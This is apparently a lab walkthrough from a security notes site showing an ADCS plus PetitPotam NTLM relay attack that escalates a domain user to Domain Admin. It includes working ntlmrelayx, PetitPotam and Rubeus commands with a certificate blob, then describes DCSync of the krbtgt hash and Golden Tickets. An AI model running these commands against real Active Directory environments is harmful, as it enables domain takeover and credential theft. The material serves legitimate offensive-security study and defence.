# ADCS + PetitPotam NTLM Relay: Obtaining krbtgt Hash with Domain Controller Machine Certificate

This is a quick lab to familiarize with an Active Directory Certificate Services \(ADCS\) + PetitPotam + NLTM Relay technique that allows attackers, given ADCS is misconfigured \(which it is by default\), to effectively escalate privileges from a low privileged domain user to Domain Admin.

## Conditions

Below are listed the conditions making an AD environment vulnerable to ADCS + NTLM relay attack:

* ADCS is configured to allow NTLM authentication;
* NTLM authentication is not protected by EPA or SMB signing;
* ADCS is running either of these services:
  * Certificate Authority Web Enrollment
  * Certificate Enrollment Web Service

## Overview

Below provides a high level overview of how the attack works:

1. Get a foothold in an AD network with a misconfigured ADCS instance;
2. Setup an NTLM relay listener on a box you control, so that incoming authentications are relayed to the misconfigured ADCS, so that a certificate of the target Domain Controller \(DC\) machine account could be obtained;
3. Force the target DC to authenticate \(using PetitPotam or PrintSpooler trick\) to the box running your NTLM relay;
4. Target DC attempts to authenticate to your NTLM relay;
5. NTLM relay receives the DC machine authentication and relays it to the ADCS;
6. ADCS provides a certificate for the target DC computer account;
7. Use the DC's computer account certificate to request its Kerberos TGT;
8. Use target DC's computer account TGT to perform [DCSync](dump-password-hashes-from-domain-controller-with-dcsync.md) and pull the NTLM hash of `krbtgt`;
9. Use `krbtgt` NTLM hash to create [Golden Tickets](kerberos-golden-tickets.md) that allow you to impersonate any domain user, including Domain Admin.

## Walkthrough

### Lab Setup

The lab is setup as follows:

* 10.0.0.5 - Kali box with NTLM relay;
* 10.0.0.6 - target Domain Controller DC01. This is the target DC that we will coerce to authenticate to our NTLM relay on 10.0.0.5;
* 10.0.0.10 - Certificate Authority \(`CA01`\). This is where our NTLM relay 10.0.0.5 will forward DC01's authentication;
* 10.0.0.7 - Windows worksation \(`WS01`\). This is the initial foothold in the network and this is the machine that will force the `DC01` to authenticate to our NTLM relay on 10.0.0.5;

### Installing Tools

Let's pull the version of impacket that has ADCS attack implemented and checkout the right branch:

```text
git clone https://github.com/ExAndroidDev/impacket.git
cd impacket
git checkout ntlmrelayx-adcs-attack
```

![](../../.gitbook/assets/image%20%281027%29.png)

### Configuring Virtual Environment

Prepare a python virtual environment for impacket. Start by installing the virtual environment package:

```text
apt install python3-venv
```

![Installing python3 virtual environment](../../.gitbook/assets/image%20%281031%29.png)

Create and activate the new virtual environment called `impacket`:

```text
python3 -m venv impacket
source impacket/bin/activate
```

![Initiating and activating the impacket virtual environment](../../.gitbook/assets/image%20%281036%29.png)

Let's install all impacket dependencies:

```text
pip install .
```

![Installing impacket dependencies](../../.gitbook/assets/image%20%281030%29.png)

### Finding Certificate Authority

On `WS01`, we can use a Windows LOLBIN `certutil.exe`, to find ADCS servers in the domain:

![CA01 is a Certificate Authority](../../.gitbook/assets/image%20%281033%29.png)

### Setting up NTLM Relay

On our kali box at 10.0.0.5, let's setup our NTLM relay and specify the target as `CA01`:

```text
examples/ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs
```

![NTLM relay is ready and waiting for incoming authentications](../../.gitbook/assets/image%20%281032%29.png)

### Forcing DC01 to Authenticate to NTLM Relay

From `WS01`, let's force the `DC01` to authenticate to our NTLM relay at 10.0.0.5 by executing [`PetitPotam`](https://github.com/topotam/PetitPotam):

```text
.\PetitPotam.exe 10.0.0.5 dc01
```

![DC01 is coerced to authenticate to 10.0.0.5. DC01$ certificate is retrieved from CA01](../../.gitbook/assets/image%20%281029%29.png)

Above shows how:

* `DC01` was forced to authenticate to 10.0.0.5;
* 10.0.0.5 relayed the `DC01$` authentication to `CA01`;
* `CA01` issued a certificate for the `DC01$` computer account.

### Requesting DC01$ TGT

On `WS01`, we can now use `rubeus` to request a Kerberos TGT for the `DC01$` computer account like so:

```text
.\Rubeus.exe asktgt /outfile:kirbi /user:dc01$ /ptt /certificate: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
```

{% hint style="info" %}
Use `runas /netonly /user:fake powershell` to create a new/sacrificial logon session into which the `DC01$` TGT will be injected to prevent messing up TGTs/TGSs for your existing logon sesion.
{% endhint %}

![TGT for DC01$ retrieved and injected into the current logon session](../../.gitbook/assets/image%20%281025%29.png)

`klist` confirms we now have a TGT for `DC01$` in the current logon session:

![TGT for DC01$ in memory](../../.gitbook/assets/image%20%281026%29.png)

We're can now perform [DCSync](dump-password-hashes-from-domain-controller-with-dcsync.md) and pull the NTLM hash for the user `offsense\krbtgt`:

{% page-ref page="dump-password-hashes-from-domain-controller-with-dcsync.md" %}

![DCSync pulls NTLM hash of krbtgt](../../.gitbook/assets/image%20%281035%29.png)

Having the NTLM hash for `krbtgt` allows us to create [Kerberos Golden Tickets](kerberos-golden-tickets.md).

{% page-ref page="kerberos-golden-tickets.md" %}

## Remember

It's worth remembering that in some AD environments there will be highly privileged accounts connecting to workstations to perform some administrative tasks and if you have local administrator rights on a compromised Windows box, you can perform ADCS + NTLM relay attack to request a certificate for that service account. To do so, you'd need the following:

* Stop the SMB service on the compromised box. This requires local admin privileges on the box and a reboot to stop the machine from listening on TCP 445;
* Spin up the NTLM relay on TCP 445;
* Wait for the service account to connect to your machine;
* Service account's authentication is relayed to the ADCS and spits out the servive account certificate;
* Use service account's certificate to request its Kerberos TGT;
* You've now gained administrative privileges on machines the compromised service account can access.

## References

{% embed url="https://posts.specterops.io/certified-pre-owned-d95910965cd2" %}

{% embed url="https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612b773-4043-4aa9-b23d-b87910cd3429" %}

